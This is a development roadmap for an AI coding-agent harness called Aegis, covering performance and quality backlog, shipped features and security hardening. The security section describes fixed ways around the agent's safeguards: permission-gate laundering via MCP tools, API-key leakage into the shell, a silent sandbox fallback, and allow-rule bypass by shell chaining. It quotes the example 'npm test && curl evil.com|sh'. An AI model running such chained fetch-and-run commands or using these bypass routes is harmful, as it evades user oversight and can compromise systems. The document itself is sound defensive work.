# Aegis Capability Roadmap
**Date:** 2026-06-29
**Updated:** 2026-07-03 (v14 — P7 security hardening track fully shipped (P7.1–P7.7); P8 performance remains open, ahead of exploratory P6/P9)

---

## Status

P2, P3, P4, P5 (all sub-items), the TQ TUI-quality track, P6.4, and all of P7 (P7.1–P7.7) are shipped — see [Appendix A](#appendix-a--completed-work) for detail on any item.

A 2026-07-03 code-level audit (three parallel passes: security, performance, feature-gap) found concrete, verified issues that outrank the exploratory P6 backlog — see **P8 (Performance)** below. P9 collects smaller engineering-quality gaps (test coverage, eval harness) that are real but lower urgency. P6 remains long-horizon/exploratory with no forcing function.

**Recommended priority order:** P8.1 → rest of P8 → P9 → P6.

**Reviewed and found sound, no action needed (from the P7 audit):** SSRF dialer (private-IP check happens at dial time, closing the DNS-rebind window); path traversal / symlink handling in `ValidatePath`; local daemon HTTP API (constant-time bearer token + loopback-origin check); persona YAML parsing (safe library, no unsafe type deserialization); `team_tasks` claim path (properly transactional, no duplicate-claim race).

---

## Open Work — P8 (Performance — 2026-07-03 audit)

### P8.1 — Session store rewrites the entire message/trace blob every turn
`internal/session/session.go:232-247` (`SaveMessages`) and `:195-229` (`AppendTraces`) do a full read-modify-write of the whole messages/traces BLOB on every single turn (`AppendTraces` even does SELECT-full-blob → unmarshal → append → re-marshal → UPDATE inside a transaction). At N turns this is O(N) work per turn → O(N²) total I/O/CPU over a session's lifetime, and the trace blob never shrinks except on VACUUM. This is the clearest scaling risk found — it taxes every turn more as a session ages.
**Fix:** move to incremental/append-only storage (separate row-per-message or a WAL-style append log) instead of whole-blob rewrite. Effort: **M**, Impact: **High**.

### P8.2 — Knowledge semantic search loads the full corpus per query
`internal/knowledge/knowledge.go:292` joins `docs_vec`/`docs` and pulls every document's vector *and full body* into memory with no `LIMIT`, then ranks in application code. At a few thousand indexed docs this is a full-corpus load on every search.
**Fix:** score against vectors only, then a second targeted query for just the top-K bodies. Effort: **M**, Impact: **Medium**.

### P8.3 — Swarm mailbox has no eviction; grows unbounded in long team sessions
`internal/swarm/mailbox.go:105-133` (`ReadAll`) lists and reads every `.json` file in the inbox directory on each call, including already-read messages, with nothing anywhere in the package that archives or deletes them. Long-running multi-agent teams accumulate ever-more file I/O per poll.
**Fix:** move read messages to a `processed/` subdir excluded from listing, or delete after ack. Effort: **S/M**, Impact: **Medium**.

### P8.4 — Token estimation double-scans the full conversation per turn for local models
`internal/engine/engine.go:240,429` (`estimateTokens`) walks every message/block in the conversation — once for the proactive-compaction check, again whenever a provider returns zero usage (all local/Ollama models hit this every turn). Two full-conversation scans per turn, scaling with session length.
**Fix:** maintain a running character/token count updated incrementally on `Append` instead of re-scanning. Effort: **S**, Impact: **Medium**.

### P8.5 — Memory relevance scoring recomputes TF-IDF from scratch on every call
`internal/memory/relevance.go:24-90,119-137` (`LoadRelevant`/`allEntries`) reloads and re-tokenizes every memory/skill file and rebuilds the full document-frequency table on every invocation, with no caching keyed on mtime/content hash. Low impact at today's memory-file scale, but pure waste.
**Fix:** cache `allEntries()`/`df` until underlying files change. Effort: **S**, Impact: **Low-Medium**.

### P8.6 — Write/execute tool calls serialize concurrent reads unnecessarily
`internal/engine/engine.go` `runTools` (~line 481-532) uses `execLock sync.RWMutex`; a single write/execute call in a round takes the write lock and excludes *all* concurrent read/network calls in that same round, rather than letting reads proceed around it. Minor throughput loss on mixed tool-call rounds.
**Fix:** scope the lock more narrowly, or let independent reads run before/after rather than fully serializing the round. Effort: **S**, Impact: **Low**.

No goroutine leaks, unbounded channels, or missing context-cancellation were found in `engine.go`/`mailbox.go`/`subprocess.go` — cancellation is checked consistently and `exec.CommandContext` is used throughout.

---

## Open Work — P9 (Engineering Quality — lower urgency, no current trigger)

### P9.1 — No eval/regression harness for agent behavior
No golden-transcript tests or scripted multi-turn scenario suite exists to catch prompt/behavior regressions across model or persona changes — unit-test coverage is otherwise good (nearly every package has a `_test.go`). Codex and Claude Code both maintain internal eval suites for this. Priority: **Medium**, Effort: **M**.

### P9.2 — Zero test coverage in `internal/trace`, `internal/logging`, `internal/api`, `internal/client`
`internal/api` in particular defines the wire contract between daemon and both clients (TUI/CLI) — untested serialization there is a real regression risk on refactors. Priority: **Medium**, Effort: **S**.

### P9.3 — No OpenTelemetry/Prometheus export
TurnTrace/cost data is SQLite-only and pull-based. Fine for a single-operator daemon; becomes relevant the moment Aegis runs as shared infra someone wants in an existing metrics stack. No current trigger — don't build speculatively. Priority: **Low**, Effort: **M**.

### P9.4 — No per-task/complexity model routing
P5.9 only reroutes on failure. Nothing picks a cheaper model for simple turns and reserves an expensive one for hard turns (cf. Aider). Plausible cheap win given cost tracking already exists, but no evidence of demand. Priority: **Low**, Effort: **M**.

### P9.5 — Cost tracking has no spend caps
`internal/cost.Tracker` only accumulates a running total; no daily/session cap or alert threshold, and no multi-tenant concept at all (by design — single-operator tool). A spend-cap config knob would be small and low-risk if a runaway-cost incident ever happens. Priority: **Low**, Effort: **S**.

### P9.6 — No bulk export/import of session/memory stores
`internal/share` already exports a single session to Markdown/JSON/HTML (stronger than expected), but migrating the full session/`longmem`/`knowledge` SQLite stores to a new machine today means copying files by hand. Priority: **Low**, Effort: **S**.

**None of P9 is blocking** — same posture as P6: real but no concrete trigger, don't build speculatively.

---

## Open Work — P6 (Long-Horizon / Exploratory)

### P6.1 — Mid-turn state persistence *(was P4.1)*
Persist partial turn state (accumulated assistant text, received tool calls) to SQLite during streaming so a crash mid-turn loses nothing. High complexity, low-probability failure mode; revisit if crash-during-long-turn becomes a reported pain point.

### P6.2 — A2A protocol integration *(was P4.2)*
Agent-to-Agent HTTP+SSE protocol (ADK Go 2.0, GA June 2026): `a2a_agent` client tool for calling remote agents + expose the daemon as an A2A server (`.well-known/agent.json` discovery). No SDK dependency — it's a protocol. Depends on P5.1 being stable (it is).

### P6.3 — MCP server mode
Expose Aegis itself as an MCP server (`aegis mcp-serve`): sessions and selected tools become MCP tools callable from other harnesses (Claude Code, Codex, editors). Complements A2A; the daemon API maps cleanly. Codex already does this and it materially expands where the harness can be embedded.

### P6.5 — Desktop / IDE surface beyond ACP
ACP covers Zed and Neovim; the web UI covers browsers. Evaluate: (a) VS Code extension speaking to the daemon API, (b) wrapping the web UI in a lightweight desktop shell. Only worth it if user demand materializes — the TUI is the product.

**None of P6.1/P6.2/P6.3/P6.5 are blocking.** P6.1 has no reported pain point; P6.2/P6.3 are interop bets with no current consumer; P6.5 is speculative. Don't build any of these without a concrete trigger — check with the user first.

---

## Appendix A — Completed Work

<details>
<summary><strong>P2 — all 9 items shipped 2026-07-01</strong></summary>

- P2.1 Ripgrep + `ls` directory tree tool
- P2.2 Bang `!` shell mode in TUI
- P2.3 Frecency-ranked @mention file autocomplete
- P2.4 File-change tracking in sidebar
- P2.5 Subagent footer strip
- P2.6 Max-step graceful degradation
- P2.7 Proactive context compaction (85% headroom check)
- P2.8 Conversation timeline dialog (`/timeline`)
- P2.9 Workflow agent primitives (sequential / parallel / loop)

</details>

<details>
<summary><strong>P3 — all 6 items shipped 2026-07-02</strong></summary>

- P3.1 Tiered long-term memory — SQLite FTS5 entity store (`internal/longmem`); `entity_remember` / `entity_recall` tools; ADK `BaseMemoryService`-compatible interface
- P3.2 Async/background task execution — `/detach` TUI command; daemon persists session to `bg_events` table; `aegis bg list/events` CLI; detached context survives TUI disconnect
- P3.3 DeepWiki-style project knowledge base — SQLite FTS5 index of docs/comments (`internal/knowledge`); `project_knowledge` tool with BM25 ranking and snippet extraction
- P3.4 Automatic rollback on tool failure — `git_sha` captured per checkpoint; `/rollback` TUI command runs `git reset --hard <sha>`; `GitRollback` flag on `RewindRequest`
- P3.6 Typed tool output schemas — optional `OutputSchemer` interface on `Tool`; `OutputSchema json.RawMessage` on `ToolSchema`; all built-in tools declare output schemas
- P3.7 Animation pause off-screen — spinner tick suppressed when `followBottom` is false; animation resumes automatically on scroll-back

</details>

<details>
<summary><strong>P4 — Core Harness Parity, all 6 items shipped 2026-07-02</strong></summary>

- P4.3 Skills progressive disclosure — `internal/skills` now injects a compact `<skills_available>` index (name + frontmatter `description:`); a `skill` builtin tool loads the full body on demand. Description-less skills fall back to eager injection.
- P4.4 User-configurable lifecycle hooks — `hooks:` config maps `pre_tool_use`/`post_tool_use`/`session_start`/`stop`/`subagent_stop` to shell commands (`internal/hooks` `Exec`); JSON event on stdin, exit 2 vetoes with stderr surfaced.
- P4.5 Headless structured output — `aegis chat --output-format text|json|stream-json`.
- P4.6 Deferred tool loading — `tool.Registry` gained `RegisterDeferred`/`Deferred`/`Load`/`SearchDeferred`; niche tools (latex, diagram, cron, lsp, longmem, team) are advertised as a `<deferred_tools>` one-liner and loaded via the `tool_search` meta-tool.
- P4.7 OS-level sandbox — `sandbox.backend: os` confines the local shell via macOS seatbelt / Linux bwrap; reported by `aegis sandbox detect`.
- P4.8 Close the loop — `git_pr` tool pushes the branch and opens a PR via `gh`, with a GitHub compare-URL fallback.

</details>

<details>
<summary><strong>P5 — all 9 items shipped 2026-07-02</strong></summary>

- P5.1 Agent teams — SQLite-backed shared task list (`swarm.TaskList`, `team_task_*` tools with atomic claim) + peer messaging (`team_send`/`team_inbox` over the file mailbox).
- P5.2 LSP tools — added `definition`, `hover`, `document_symbols`, `workspace_symbols`, `call_hierarchy` (registered deferred).
- P5.3 Pluggable web search — `search:` config selects brave/tavily/searxng; DuckDuckGo scrape remains the zero-config fallback.
- P5.4 Background notifications — `notify:` config fires desktop (osascript/notify-send/toast) and/or webhook on background-session completion/error.
- P5.5 @file#L10-40 line-range mentions — server expands `@path#L10-40` tokens in user messages to inline file excerpts before the engine call.
- P5.6 Draft stash — unsent textarea content saved to `.aegis/stash.json` on quit; restored on next session start.
- P5.7 Bundle install from git URL — `aegis bundle install/info <git-url>` clones `--depth=1` to temp dir and installs as a normal local bundle.
- P5.8 Semantic recall layer — `internal/embed` (Ollama `/api/embed` client, cosine similarity, reciprocal-rank fusion); `knowledge.Store` and `longmem.Store` gained an optional `Embedder` and a `docs_vec`/`mem_vec` BLOB vector table; `Search`/`SearchMemory` fuse BM25 + semantic rankings via RRF when `embeddings.enabled: true`, else BM25-only (default). `aegis knowledge index` CLI command added. Along the way, fixed a real gap: `knowledge.Store`/`longmem.Store` were built but never opened by the daemon — `project_knowledge`/`entity_remember`/`entity_recall` were dead tools; now wired into `internal/server`.
- P5.9 Provider failover — `provider.WithFailover` chains a primary adapter with ordered fallback targets, switching only on synchronous Stream failure after each target's own retry budget is exhausted (never mid-stream, so no partial output is replayed). `provider.fallback` config (ordered provider/model/base_url entries) + `provider.allow_cloud_fallback` guard: local→cloud failover is skipped with a warning unless explicitly opted in; cloud→cloud and any→local are never gated. `providerfactory.Build` assembles the chain.

</details>

<details>
<summary><strong>P7.1 — MCP capability laundering fixed, shipped 2026-07-03</strong></summary>

- `mcp.ServerConfig` gained `capability` (per-server default) and `tool_capabilities` (per remote tool name override) config fields; `internal/config.MCPServerConfig` and `internal/server` wiring pass them through.
- `internal/mcp/tool.go`: `mcpTool`/`mcpResourceListTool`/`mcpResourceReadTool`/`mcpPromptListTool`/`mcpPromptGetTool` all carry a resolved `tool.Capability` field instead of hardcoding `tool.CapNetwork`; `resolveCapability`/`parseCapability` default anything unlabeled/unrecognized to `tool.CapExecute` (most restrictive), matching the existing `internal/plugins` process-tool pattern.
- Net effect: an unlabeled or untrusted MCP server's tools now hit the `Ask` gate in build mode and are denied outright in plan mode, instead of the always-allowed `network` capability. Trusted servers opt back into `network` (or any other class) explicitly per-server or per-tool.
- Tests: `internal/mcp/mcp_test.go` — `TestParseCapabilityDefaultsToExecute`, `TestResolveCapabilityPerToolOverride`, `TestResolveCapabilityDefaultsExecuteWithNoConfig`.
- Docs updated: `docs/configuration.md` (MCP server example with `capability`/`tool_capabilities`), `docs/security.md` (`egress_then_write` network-capability description).

</details>

<details>
<summary><strong>P7.2–P7.7 — remaining security-hardening audit items, shipped 2026-07-03</strong></summary>

- **P7.2 (shell env leak):** `internal/sandbox/env.go` (new) strips `ANTHROPIC_API_KEY`/`OPENAI_API_KEY` (`DefaultStripEnv`) from `cmd.Env` in both `LocalBackend` and `OSBackend` (`local.go`, `os_sandbox.go`); `sandbox.strip_env` config (`config.SandboxConfig.StripEnv`) adds more names (e.g. MCP tokens from `.aegis/.env`) via `NewLocalBackendWithEnv`/`NewOSBackend`'s new param. Container backend untouched — `docker run`/`podman run` never passed host env into the container to begin with.
- **P7.3 (exec allow-rule chaining bypass):** `internal/permission/rules.go` adds `globToRegexpExec` — for an `allow` rule scoping an execute-capability tool, `*`/`?` cannot span shell chaining/substitution chars (`;&|`+"`"+`$()<>` + newline), so `allow bash(npm test*)` no longer matches `npm test && curl evil.com|sh`. Deny rules deliberately keep the original broad `.*` (over-matching on deny is safe).
- **P7.4 (silent sandbox fallback):** sandbox backend selection extracted to standalone `server.selectSandbox` (testable in isolation); `sandbox.strict` config makes a failed `container`/`os` backend init a hard startup error instead of silently falling back to local. Non-strict fallback is recorded on `Server` and surfaced via `/healthz` (`api.HealthStatus.SandboxFallback`); `client.Status()` + `cli.warnSandboxFallback` print a warning banner in the TUI/`aegis ui` before entering a session.
- **P7.5 (persona mode escalation):** `persona.Persona` gained a `Loaded bool` field (true only for `*.md`-parsed personas, never built-ins); `server.resolveSessionMode` ignores a loaded persona's `mode: auto` when it's more permissive than the configured default and the caller didn't explicitly request a mode, logging a warning instead. Built-in personas remain fully trusted.
- **P7.6 (no bundle provenance check):** `bundle.Bundle.ContentHash()` computes a deterministic `sha256:`-prefixed digest over the manifest + every artifact file; `aegis bundle info` prints it, `aegis bundle install --expect-sha256 <hash>` aborts before writing anything on mismatch. Trust-on-first-use pinning, not a signature.
- **P7.7 (silent no-op deny rules):** `permission.WarnUnmatchableRules` (called once at startup against `tool.Registry.All()`, a new method) flags any non-`*`-pattern rule targeting a tool whose input schema has none of `subjectFor`'s recognized fields (`command`/`path`/`file_path`/`url`/`query`/`pattern`) — such a rule can never match, so it's logged instead of silently no-op'ing.
- Docs: `docs/configuration.md`, `docs/security.md`, `docs/permissions.md`, `docs/personas.md`, `docs/extensibility.md` all updated with the new config knobs/flags and their security rationale.

</details>

<details>
<summary><strong>P6.4 — Context editing / tool-result pruning, shipped 2026-07-03</strong></summary>

`compaction.pruneStaleToolResults` (`internal/compaction/prune.go`) runs as a deterministic pre-pass inside `Summarizer.Compact`, before any LLM call: `read_file` results for a path that was read again later are blanked to a one-line marker, and large `grep`/`glob`/`ls` dumps outside the trailing `keepRecent` window are truncated to a short preview. Never touches conversational text, tool errors, or the recent window. If pruning alone brings the estimate back under budget, `Compact` returns immediately — no summarizer call, no LLM cost.

</details>

<details>
<summary><strong>TQ — TUI Quality Track, all 11 items shipped (complete 2026-07-03)</strong></summary>

A code-level review of `internal/tui` against the Claude Code and opencode/Crush TUI experience found the recurring gap: Aegis rendered the conversation as one append-only styled string (`cappedBuffer` + wrap caches), while the streamlined harnesses model it as a list of typed message blocks rendered and cached individually. TQ1 fixed that structural gap; the rest is diff quality, streaming markdown, and interaction polish.

| # | Item | Shipped |
|---|------|---------|
| TQ1 | Block-based transcript model — `internal/tui/transcript.go`: `transcriptBlock` (raw ANSI content + per-block width-keyed wrap cache) replaces the old whole-buffer `cappedBuffer`/`wrapCache`; `liveBlock` keeps the settled-prefix boundary-cache trick so a long streaming reply stays O(tail) per token. Trimming drops whole blocks instead of severing content mid-line. | 2026-07-02 |
| TQ2 | Real unified diffs — LCS-based Myers diff in `toolview.go`; context lines, `+`/`-` markers, `@@ ... @@` separators between hunks. Replaces delete-all/add-all. | 2026-07-02 |
| TQ4a/b | Copy affordances — `/copy` copies last assistant message via `pbcopy`/`xclip`/`clip.exe`; `/copy N` copies Nth fenced code block; toast confirmation. | 2026-07-02 |
| TQ5 | Toggleable sidebar — `sidebarOpen bool` (default off); `ctrl+b` / `/sidebar` toggle; context %, cost, agent count folded into status bar when hidden. | 2026-07-02 |
| TQ7 | Live todo strip — intercepts `todo_add`/`todo_update`/`todo_list` tool results; renders `▣▶▢` progress strip above input with in-progress task text. | 2026-07-02 |
| TQ3 | Streaming markdown — the live tail renders through glamour incrementally: `liveBlock.render` takes a markdown-render callback, trailing newlines normalized so settled-prefix + tail concatenation is byte-identical to a whole-source render. No end-of-turn restyle "pop". | 2026-07-03 |
| TQ9 | Input polish bundle — `shift+enter` newline (Kitty key disambiguation, `ctrl+j` fallback); pasted image paths become `@image:` attachment tokens (`extractImageRefs`, regex-based, quoted-path support); ↑/↓ move the cursor inside a multiline draft with history nav only at first/last line; thinking blocks collapse to `✻ thought for Ns` (`ctrl+o` to expand). | 2026-07-03 |
| TQ8 | Message queueing — `alt+enter` during streaming queues the draft as the next user turn (dimmed `⏳ queued ▸` block); queued messages auto-send one per completed run at stream close. Explicit cancel or a stream error discards the queue. | 2026-07-03 |
| TQ6 | Richer approval flow — y/a/n banner replaced by an option-list dialog (`internal/tui/approval.go`): `Allow once / Allow always for pattern / Deny / Deny with feedback`, diff/command preview. "Allow always" derives a scoped pattern (`suggestRulePattern`) and persists it to `.aegis/config.yaml → permission.rules` (`config.AppendProjectPermissionRule`). "Deny with feedback" steers the typed reason back to the model. | 2026-07-03 |
| TQ10 | Theme system — the hardcoded Charmtone palette moved behind `colorScheme` (`internal/tui/colorscheme.go`) with `darkScheme`/`lightScheme` built-ins; `tui.theme` config key applied before styles are built; glamour markdown style and ANSI-16 shell-output remap follow the scheme. | 2026-07-03 |

Remaining cosmetic stretch ideas (not scheduled): TQ4c scoped mouse capture, terminal-background auto-detection for theme selection.

</details>

---

## Appendix B — 2026-07 Landscape Review

What changed in the top-tier harnesses since the 2026-06-29 competitive analysis, and what it means for Aegis.

**Claude Code** (the closest architectural relative):
- **Agent Teams** (Feb 2026, with Opus 4.6) — peer sessions that message each other directly, claim tasks from a shared task list, and challenge each other's findings. Distinct from subagents (which report up to a parent). Aegis's swarm mailbox was the right substrate; P5.1 added the shared task list and peer messaging semantics.
- **Skills with progressive disclosure** — only skill *name + description* load at session start; the full body loads on invocation. Addressed by P4.3.
- **Lifecycle hooks as user config** — shell commands / HTTP endpoints / LLM prompts firing on `PreToolUse`, `PostToolUse`, `Stop`, `SubagentStop`, `SessionStart`, `Notification`; exit code 2 vetoes a tool call. Addressed by P4.4.
- **Deferred tools / ToolSearch** — tool schemas lazy-loaded via a search meta-tool instead of shipping every schema every turn. Addressed by P4.6.
- **Dispatch & Channels** — programmatic task submission via API plus event streams for dashboards/alerting. No Aegis equivalent; not scheduled.
- **Background agents finish the job** — commit, push, and open a draft PR when code work completes in a worktree. Addressed by P4.8.

**opencode** — 75+ providers via Models.dev; TypeScript plugin system with 25+ lifecycle hooks; experimental LSP *tool* (go-to-definition, references, hover, call hierarchy — addressed by P5.2); session share links; desktop app + IDE extension (relates to open P6.5).

**Codex CLI** — default-on sandboxing (container, plus OS-level seatbelt/Landlock when no container — addressed by P4.7); headline **token efficiency** (~4× fewer tokens than peers on Terminal-Bench — related to open P6.4/context-editing work, now shipped); runs as an MCP *server* (relates to open P6.3); native GitHub Actions + auto-PR; Rust rewrite.

**Gemini CLI** — 1M context standard; Google Search grounding; 90+ extensions; subagents with parallel delegation (Apr 2026); being folded into the Antigravity platform.

**Convergent themes across all four:** (1) token efficiency as a first-class metric, (2) user-configurable lifecycle hooks, (3) lazy/progressive context loading (skills, tools, docs), (4) headless/programmatic operation with structured output, (5) forge integration that completes the loop (PR out the other end), (6) sandboxing that doesn't require Docker. Aegis has now closed 1, 2, 3, 5, and 6; A2A/MCP-server interop (P6.2/P6.3) is the remaining open convergent theme.

**Where Aegis was already at or ahead of parity** (no action needed): prompt-cache breakpoints in the Anthropic adapter; per-turn structured traces + cost budget enforcement; checkpoints/rewind + git rollback; output validation guard (LLM rubric + schema modes); cron scheduling; container sandbox matrix (Docker/Podman/WSL/Apple); ACP editor protocol; local-LLM-first provider posture; 17 security personas + contextual security policies (egress-then-write); audit trail.

---

## Appendix C — Gap Analysis

| # | Category | Gap | Present in | Severity | Status |
|---|----------|-----|-----------|----------|--------|
| 1 | Context efficiency | Skills fully injected into system prompt (no progressive disclosure) | Claude Code | High | ✅ P4.3 |
| 2 | Extensibility | No user-configurable lifecycle hooks | Claude Code, opencode | High | ✅ P4.4 |
| 3 | Context efficiency | All 39+ tool schemas sent every turn; no deferred tool loading | Claude Code (ToolSearch) | High | ✅ P4.6 |
| 4 | Automation | Headless `aegis chat` emits plain text only | Claude Code, Codex | High | ✅ P4.5 |
| 5 | Safety | Local sandbox backend = no isolation | Codex CLI (default-on) | High | ✅ P4.7 |
| 6 | Workflow | Git tool stops at commit; no push / PR creation | Claude Code, Codex | High | ✅ P4.8 |
| 7 | Multi-agent | Subagents report up only; no shared task list or peer messaging | Claude Code Agent Teams | Medium | ✅ P5.1 |
| 8 | Tools | LSP tools = diagnostics + references only | opencode | Medium | ✅ P5.2 |
| 9 | Tools | Web search scrapes DuckDuckGo HTML | Gemini, Claude Code | Medium | ✅ P5.3 |
| 10 | Automation | No notification channel for detached sessions | Claude Code, Channels | Medium | ✅ P5.4 |
| 11 | TUI | No `@file#start-end` line-range syntax | opencode | Low | ✅ P5.5 |
| 12 | TUI | No draft stash across sessions | opencode | Low | ✅ P5.6 |
| 13 | Persistence | No mid-turn state persistence on crash | Crush, opencode | Low | ⬜ P6.1 |
| 14 | Interop | No A2A protocol; cannot act as an MCP server | ADK, Codex | Low | ⬜ P6.2/P6.3 |
| 15 | Extensibility | Bundles install from local path only | opencode plugin ecosystem | Low | ✅ P5.7 |
| 16 | Memory | Knowledge/longmem retrieval is BM25-only | Cursor, Devin | Low | ✅ P5.8 |
| 17 | Reliability | No provider failover | Aider (litellm routing) | Low | ✅ P5.9 |
| — | Context efficiency | No deterministic tool-result pruning before LLM compaction | Codex CLI (token efficiency) | Low | ✅ P6.4 |
| 18 | Security | MCP tools hardcode capability as `network`, bypassing permission gate in any mode | — (internal audit) | **Critical** | ✅ P7.1 |
| 19 | Security | Shell exec inherits full env (API keys); web_fetch enables exfil to public hosts | — (internal audit) | High | ✅ P7.2 |
| 20 | Security | Permission allow-rule glob matches whole command string, bypassed by shell chaining | — (internal audit) | High | ✅ P7.3 |
| 21 | Security | Sandbox backend silently fails open to unsandboxed exec | — (internal audit) | Medium | ✅ P7.4 |
| 22 | Security | Bundle persona can silently escalate session to `auto` mode | — (internal audit) | Medium | ✅ P7.5 |
| 23 | Security | No signature/checksum verification on git-URL bundle installs | opencode plugin registry | Medium | ✅ P7.6 |
| 24 | Security | Deny rules silently no-op for tools with non-standard argument fields | — (internal audit) | Low | ✅ P7.7 |
| 25 | Performance | Session store rewrites entire message/trace blob every turn — O(N²) over session life | — (internal audit) | High | ⬜ P8.1 |
| 26 | Performance | Knowledge semantic search loads full corpus (vectors + bodies) per query | — (internal audit) | Medium | ⬜ P8.2 |
| 27 | Performance | Swarm mailbox has no eviction, grows unbounded | — (internal audit) | Medium | ⬜ P8.3 |
| 28 | Performance | Token estimation double-scans full conversation per turn (local models) | — (internal audit) | Medium | ⬜ P8.4 |
| 29 | Performance | Memory relevance TF-IDF recomputed from scratch every call | — (internal audit) | Low-Med | ⬜ P8.5 |
| 30 | Performance | Write/execute tool calls unnecessarily serialize concurrent reads | — (internal audit) | Low | ⬜ P8.6 |
| 31 | Quality | No agent-behavior eval/regression harness | Codex, Claude Code (internal eval suites) | Medium | ⬜ P9.1 |
| 32 | Quality | Zero test coverage in trace/logging/api/client packages | — (internal audit) | Medium | ⬜ P9.2 |

---

## Appendix D — Sources (2026-07-02 review)

- [Claude Code changelog](https://code.claude.com/docs/en/changelog) · [Steering Claude Code: skills, hooks, subagents](https://claude.com/blog/steering-claude-code-skills-hooks-rules-subagents-and-more) · [Agent Teams / subagents guide](https://saascity.io/blog/claude-code-subagents-agent-teams-2026) · [Q1 2026 update roundup](https://www.mindstudio.ai/blog/claude-code-q1-2026-update-roundup)
- [opencode docs](https://opencode.ai/docs/) · [opencode LSP servers](https://opencode.ai/docs/lsp/) · [opencode internals deep-dive](https://cefboud.com/posts/coding-agents-internals-opencode-deepdive/)
- [Claude Code vs Codex vs Gemini CLI (2026)](https://www.deployhq.com/blog/comparing-claude-code-openai-codex-and-google-gemini-cli-which-ai-coding-assistant-is-right-for-your-deployment-workflow) · [System prompts compared](https://codex.danielvaughan.com/2026/04/19/system-prompts-compared-codex-gemini-claude-code/) · [Agent capabilities compared](https://www.aimadetools.com/blog/claude-code-vs-codex-vs-gemini-agents-2026/)
